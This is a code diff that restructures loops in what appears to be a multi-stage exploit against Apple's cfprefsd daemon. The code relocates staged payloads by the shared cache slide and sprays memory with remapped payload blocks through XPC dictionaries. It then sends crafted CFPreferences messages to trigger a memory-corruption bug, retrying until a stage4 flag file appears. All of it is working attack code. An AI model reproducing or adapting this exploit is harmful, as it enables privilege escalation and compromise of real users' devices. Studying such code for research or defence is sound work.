@@ -93,12 +93,12 @@ printf("slide = 0x%lx\n", shared_cache_slide);
 // the relocs are parsed backwards, until 0 (inclusive, thus setting stage4[0] = slide)
 
 cur4 = &stage4_end;
-rel4_loop:
+do {
     cur4 = cur4 - 8;
     off4 = *cur4;
     ptr4_dst = ptr4_src = &stage4_begin + off4;
     *ptr4_dst = *ptr4_src + shared_cache_slide;
-    if (off4) goto rel4_loop; // XXX this construct will add an extra slide to offset=0, but ok
+} while (off4); // XXX this construct will add an extra slide to offset=0, but ok
 stage4_size = cur4 - &stage4_begin;
 
 // relocate stage3
@@ -106,13 +106,14 @@ stage4_size = cur4 - &stage4_begin;
 // the relocs are parsed backwards, until 0 (exclusive, leave stage3[0] intact)
 
 cur3 = &stage3_end;
-rel3_loop:
+while (1) {
     cur3 = cur3 - 8;
-    if !(off3 = *cur3) goto rel3_done;
+    if !(off3 = *cur3) {
+        break;
+    }
     ptr3_dst = ptr3_src = &stage3_begin + off3;
     *ptr3_dst = *ptr3_src + shared_cache_slide;
-    goto rel3_loop;
-rel3_done:
+}
 stage3_size = cur3 - &stage3_begin + STAGE3_FAKE_OBJECT_SZ;
 
 // write the relocated stage4 to disk
@@ -183,10 +184,10 @@ fake_40 = &fake + GUESS_SHIFT + 0x20;
 payload_block = payload_block_cur = malloc(block_size);
 
 i = PAYLOAD_COUNT_PER_BLOCK;
-block_loop:
+do {
     _platform_memmove(payload_block_cur, &fake, stage3_size);
     payload_block_cur = payload_block_cur + PAYLOAD_SIZE;
-    if (i = i - 1) goto block_loop;
+} while (i = i - 1);
 
 // Now create an even larger copy of that payload block by remapping it several times
 // consecutively. This object will take up the same amount of memory as the single payload
@@ -207,10 +208,10 @@ _platform_memmove(mapping, payload_block, block_size);
 protection = { 0, 0 };
 remap_address = mapping;
 j = PAYLOAD_BLOCKS_PER_MAPPING;
-remap_loop:
+do {
     mach_vm_remap(*mach_task_self_, &remap_address, block_size, 0, VM_FLAGS_FIXED + VM_FLAGS_OVERWRITE, *mach_task_self_, mapping, FALSE, protection, protection + 8, VM_INHERIT_NONE);
     remap_address = remap_address + block_size;
-    if (j = j - 1) goto remap_loop;
+} while (j = j - 1);
 
 // All set! We should have one big memory object now.
 ;// XXX free(payload_block);
@@ -233,10 +234,10 @@ spray_dict = xpc_dictionary_create(NULL, NULL, 0); // XXX not need to be volatil
 
 key = { 0, 0, 0, 0 };
 k = PAYLOAD_MAPPING_COUNT;
-huge_loop:
+do {
     sprintf(key, "%d", k);
     xpc_dictionary_set_value(spray_dict, key, map);
-    if (k = k - 1) goto huge_loop;
+} while (k = k - 1);
 xpc_array_append_value(arr, spray_dict);
 
 xpc_dictionary_set_int64(huge_dict2, "CFPreferencesOperation", 5);
@@ -253,15 +254,15 @@ _platform_memset(value2, 'Q', FILL_SIZE - 1);
 *value = GUESS_HIGH + (GUESS_ADDR + GUESS_SHIFT);
 
 l = FILL_DICT_COUNT;
-repl_loop:
+do {
     sprintf(key, "%d", l);
     xpc_dictionary_set_string(spray_dict, key, value);
-    if (l = l - 1) goto repl_loop;
+} while (l = l - 1);
 
 m = FILL_COUNT;
-repl_arr_loop:
+do {
     xpc_array_append_value(arr, spray_dict);
-    if (m = m - 1) goto repl_arr_loop;
+} while (m = m - 1);
 
 xpc_dictionary_set_int64(repl_dict2, "CFPreferencesOperation", 5);
 xpc_dictionary_set_value(repl_dict3, "CFPreferencesMessages", arr);
@@ -276,11 +277,11 @@ xpc_dictionary_set_int64(arr_free, "CFPreferencesOperation", 4);
 xpc_array_append_value(arr, arr_free_);
 
 n = FREE_COUNT;
-vuln_loop:
+do {
     arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);
     xpc_dictionary_set_int64(arr_elem1, "CFPreferencesOperation", 20);
     xpc_array_append_value(arr, arr_elem1);
-    if (n = n - 1) goto vuln_loop;
+} while (n = n - 1);
 
 xpc_dictionary_set_int64(vuln_dict2, "CFPreferencesOperation", 5);
 xpc_dictionary_set_value(vuln_dict3, "CFPreferencesMessages", arr);
@@ -288,7 +289,7 @@ xpc_dictionary_set_value(vuln_dict3, "CFPreferencesMessages", arr);
 /////////////// trigger ///////////////
 
 retry = 30;
-trigger_loop:
+do {
     //printf("run\n");
     volatile conn = [[stack=512]]xpc_connection_create_mach_service("com.apple.cfprefsd.daemon", 0, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
     xpc_connection_set_event_handler(conn, { _NSConcreteGlobalBlock, 0x50000000, CFShow, { 0, 0x20, "v16@?0@\"NSObject<OS_xpc_object>\"8", 0 } });
@@ -308,8 +309,10 @@ trigger_loop:
     xpc_connection_send_message(client, repl_dict);
     xpc_connection_send_message(conn, vuln_dict);
     sleep(3);
-    if !(access(STAGE4_FLAG, F_OK)) goto done;
-    if (retry = retry - 1) goto trigger_loop;
+    if !(access(STAGE4_FLAG, F_OK)) {
+        break;
+    }
+} while (retry = retry - 1);
 
 done:
 exit(42);
